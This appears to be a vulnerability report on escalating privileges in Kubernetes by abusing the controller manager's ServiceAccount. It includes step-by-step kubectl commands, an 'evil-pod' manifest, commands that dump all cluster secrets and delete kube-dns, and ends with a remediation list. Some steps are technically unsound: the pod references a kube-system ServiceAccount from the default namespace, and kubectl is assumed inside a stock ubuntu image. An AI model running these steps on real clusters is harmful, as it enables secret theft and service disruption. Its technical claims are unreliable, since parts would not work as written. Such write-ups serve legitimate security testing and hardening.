
# Kubernetes Controller Manager Privilege Abuse

## 1. Overview Section

**Attack Vector Description:**

An attacker who has gained unauthorized access to the Kubernetes cluster, potentially through a compromised pod or node, attempts to escalate their privileges by abusing misconfigured or overly permissive RBAC (Role-Based Access Control) roles granted to the controller manager. The controller manager is a critical component responsible for managing and maintaining the cluster's desired state. If an attacker can impersonate or control the controller manager, they can manipulate cluster resources, deploy malicious workloads, and compromise the entire Kubernetes environment. This attack focuses on exploiting weakly secured permissions associated with the controller manager's ServiceAccount.

**Potential Impact and Consequences:**

*   **Full Cluster Compromise:** The controller manager has extensive privileges. Exploiting this vulnerability allows an attacker to create, modify, and delete any resource within the cluster, including pods, services, deployments, namespaces, secrets, and configmaps.
*   **Data Exfiltration:** Attackers can access and exfiltrate sensitive data stored in secrets, configmaps, or persistent volumes.
*   **Denial of Service:** Attackers can disrupt cluster operations by deleting critical resources, overwhelming the control plane, or deploying resource-intensive workloads.
*   **Lateral Movement:** Attackers can use the compromised controller manager to pivot to other systems within the network and gain access to other resources outside the Kubernetes cluster.
*   **Malware Injection:** Injecting malicious code into existing deployments or creating new compromised deployments.

**Risk Level Assessment:**

**Critical**

**Technical Explanation of Why This Vulnerability Exists:**

This vulnerability exists when the controller manager's ServiceAccount has overly permissive RBAC bindings. This can happen in several ways:

1.  **Misconfigured or overly broad ClusterRoleBindings:** The default `cluster-admin` role might be inappropriately bound to the controller manager's ServiceAccount.
2.  **Custom ClusterRoles with excessive permissions:** Custom ClusterRoles providing broad access to resource types (e.g., `*`) and verbs (e.g., `*`) might be granted to the controller manager.
3.  **Accidental or unintentional misconfigurations:** Human error in defining and applying RBAC policies.

The core problem is that the principle of least privilege is violated: the controller manager is granted more permissions than it strictly needs to perform its intended functions.

**Prerequisites and Conditions Needed:**

1.  **Compromised Pod or Node:** The attacker needs an initial foothold within the Kubernetes cluster, usually obtained through a vulnerability in an application running in a pod, or through direct access to a node.
2.  **Identification of Controller Manager ServiceAccount:** The attacker needs to identify the ServiceAccount used by the controller manager, typically found in the controller manager's pod definition.
3.  **Network Access:**  Network access from the compromised pod or node to the Kubernetes API server is required.
4.  **Insufficient RBAC Hardening:** The controller manager's ServiceAccount must have overly permissive RBAC bindings (ClusterRoleBindings or RoleBindings).

## 2. Validation and Exploitation Steps Section

This section assumes the attacker has already compromised a pod within the Kubernetes cluster and has access to a shell inside it.

**Validation Phase:**

**Step 1: Identify the Controller Manager's ServiceAccount.**

```bash
kubectl get pods -n kube-system -o wide | grep kube-controller-manager
```

**Explanation:** This command lists all pods in the `kube-system` namespace (where the controller manager usually runs), displays detailed output, and filters the results to show only pods containing "kube-controller-manager" in their name.

**Expected Output:** Should show the pod(s) running the controller manager. Note the name of the pod.  Example:

```
kube-controller-manager-controlplane-xxx   2/2     Running   0          6d2h     10.244.1.10   controlplane   <none>           <none>
```

**Why:** To find the pod running the controller manager so we can determine its ServiceAccount.

**Step 2: Describe the Controller Manager pod to determine its ServiceAccount.**

```bash
kubectl describe pod kube-controller-manager-controlplane-xxx -n kube-system | grep -i "Service Account Name"
```

**Explanation:** Replace `kube-controller-manager-controlplane-xxx` with the actual name from the previous step. This command describes the specified pod and then filters the output to display the line containing "Service Account Name".

**Expected Output:** Should display the ServiceAccount name. Example:

```
Service Account Name:                kube-controller-manager
```

**Why:**  The `Service Account Name` field reveals which ServiceAccount the controller manager is using.

**Step 3: Check the RBAC bindings for the Controller Manager's ServiceAccount.**

```bash
kubectl get clusterrolebindings | grep kube-controller-manager
kubectl get rolebindings -n kube-system | grep kube-controller-manager
```

**Explanation:** These commands search for ClusterRoleBindings and RoleBindings that reference the controller manager's ServiceAccount. The first command searches cluster-wide, and the second one searches specifically within the `kube-system` namespace.

**Expected Output:** If the ServiceAccount has excessive permissions, you'll likely find bindings to roles like `cluster-admin` or custom roles with broad permissions.  Look for lines that indicate the ServiceAccount is bound to a ClusterRole like `cluster-admin`.  Example:

```
kube-controller-manager                                    ClusterRole/cluster-admin                                      10d
```

**Why:** To determine what permissions are assigned to the controller manager's ServiceAccount.  A `cluster-admin` binding is a clear indicator of excessive permissions.

**Step 4: (If a custom ClusterRole is found) Inspect the ClusterRole.**

```bash
kubectl describe clusterrole <clusterrole-name>
```

**Explanation:**  If the previous step revealed a custom ClusterRole bound to the controller manager's ServiceAccount (instead of `cluster-admin`), replace `<clusterrole-name>` with the actual name and describe the ClusterRole to examine its permissions.

**Expected Output:**  Detailed information about the ClusterRole, including the API groups, resources, and verbs that it grants access to.  Look for wildcard permissions like `resources: ["*"]` and `verbs: ["*"]`.

**Why:** To understand the exact permissions granted by the custom ClusterRole.

**Exploitation Phase:**

The exploitation phase relies on impersonating the controller manager's ServiceAccount and then using those privileges to perform malicious actions.

**Step 5: Create a temporary pod using the controller manager's ServiceAccount.**

This requires a manifest file.  Create a file named `evil-pod.yaml` with the following content:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: evil-pod
  namespace: default
spec:
  serviceAccountName: kube-controller-manager # IMPORTANT: Use the controller manager's ServiceAccount
  containers:
  - name: evil-container
    image: ubuntu:latest
    command: ["/bin/bash", "-c", "sleep 3600"]
  restartPolicy: Never
```

**Explanation:** This YAML file defines a simple pod named "evil-pod" in the "default" namespace.  The crucial part is `serviceAccountName: kube-controller-manager`, which tells Kubernetes to use the controller manager's ServiceAccount for this pod. The container runs a simple `sleep` command to keep it alive.  **Important**: Replace `kube-controller-manager` with the actual ServiceAccount name discovered earlier if it is different.

**Step 6: Deploy the evil pod.**

```bash
kubectl apply -f evil-pod.yaml
```

**Explanation:** This command creates the pod defined in the `evil-pod.yaml` file.

**Expected Output:**

```
pod/evil-pod created
```

**Why:** To launch a pod that has the same permissions as the controller manager.

**Step 7: Get a shell into the evil pod.**

```bash
kubectl exec -it evil-pod -- /bin/bash
```

**Explanation:**  This command allows you to execute commands inside the `evil-pod`.

**Expected Output:**  A bash shell prompt inside the `evil-pod`.

**Why:** Now we have a shell with the privileges of the controller manager.

**Step 8: Verify elevated privileges (Example: List all secrets in the cluster).**

```bash
kubectl get secrets --all-namespaces
```

**Explanation:**  This command lists all secrets in all namespaces.  A regular pod with limited permissions would not be able to do this.

**Expected Output:** A complete list of all secrets in all namespaces.  If you can see all secrets, then you have successfully validated the privilege escalation.

**Why:** To confirm that the pod has the expected high-level permissions.

**Step 9: (Optional) Perform malicious actions (Example: Delete a critical deployment).**

**WARNING: Do this in a controlled test environment ONLY. This will disrupt the cluster.**

```bash
kubectl delete deployment kube-dns -n kube-system
```

**Explanation:** This command deletes the `kube-dns` deployment in the `kube-system` namespace.  This is a critical component for name resolution in the cluster, and deleting it will cause significant disruption.

**Expected Output:** The `kube-dns` deployment will be deleted. Services that rely on DNS will begin to fail.

**Why:** Demonstrates the power an attacker gains by compromising the controller manager's ServiceAccount.

**Alternative Approaches for Exploitation:**

*   **Direct API Access (using impersonation):**  Instead of creating a pod, the attacker could directly interact with the Kubernetes API server using the ServiceAccount's token and impersonation. This involves obtaining the token from the controller manager's pod or node and then using the `kubectl` `--as` and `--as-group` flags to impersonate the ServiceAccount.  This method bypasses the need to create a new pod.
*   **Modifying existing deployments:** The attacker could modify existing deployments to inject malicious code or change resource limits to cause denial of service.
*   **Creating new malicious deployments:** Deploy new pods that run malicious software, steal data, or participate in botnets.

**Remediation Recommendations:**

1.  **Principle of Least Privilege:**  The controller manager should only be granted the minimum set of permissions necessary to perform its functions. Avoid using the `cluster-admin` role. Create custom roles that precisely define the required permissions.
2.  **RBAC Auditing:** Regularly review and audit RBAC policies to identify and correct any misconfigurations or overly permissive bindings.
3.  **Limit ServiceAccount Token Exposure:**  Restrict access to ServiceAccount tokens to only those who need them.  Disable the automatic mounting of ServiceAccount tokens where it's not necessary.
4.  **Pod Security Standards:** Enforce Pod Security Standards (PSS) to prevent pods from running with elevated privileges.
5.  **Network Policies:** Implement network policies to restrict network access between pods and limit the blast radius of any compromise.
6.  **Runtime Security:** Employ runtime security tools that can detect and prevent malicious activity within containers, such as unexpected API calls or unauthorized file access.
7.  **Regular Security Assessments:** Conduct regular penetration tests and security audits to identify and address vulnerabilities in your Kubernetes cluster.
8.  **Update Kubernetes Regularly:** Keep your Kubernetes cluster up-to-date with the latest security patches to address known vulnerabilities.
9.  **Monitoring and Alerting:**  Implement robust monitoring and alerting to detect suspicious activity, such as unauthorized API calls or unexpected resource usage.

By implementing these remediation steps, you can significantly reduce the risk of controller manager privilege abuse and protect your Kubernetes cluster from attack.
